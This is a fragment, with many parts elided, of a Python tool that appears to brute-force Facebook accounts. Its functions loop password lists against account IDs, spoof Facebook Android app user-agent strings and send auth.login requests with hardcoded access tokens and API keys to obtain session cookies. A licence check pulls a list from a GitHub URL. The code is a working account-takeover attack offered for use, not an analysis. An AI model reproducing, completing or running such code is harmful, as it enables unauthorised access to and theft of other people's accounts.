...
\033[1;97m[×] Version  : \033[1;32m1.2 
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+';[Davik/2.1.0 (Linux;  U; Android 8.0.1; CPH2421 Build/TP1A.220905.001) [FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=3.0,width=720,height=1440};FBLC/fr_DZ;FBRV/273474118;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2421;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'+'[Davik/2.1.0 (Linux;  U; Android 8.0.1; CPH1803 Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=1.5,width=720,height=1440};FBLC/fr_DZ;FBRV/273474118;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1803;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
                li = ['28','29','210']
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"7329751959|AAGOC3QTdvY19Ceb0zd8mFKj4Jgp_ofZkzg","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
...
def main_apv():
    ...
    r1 = requests.get('https://github.com/TAKOS-03/ROKS/blob/main/ROOMSA').text
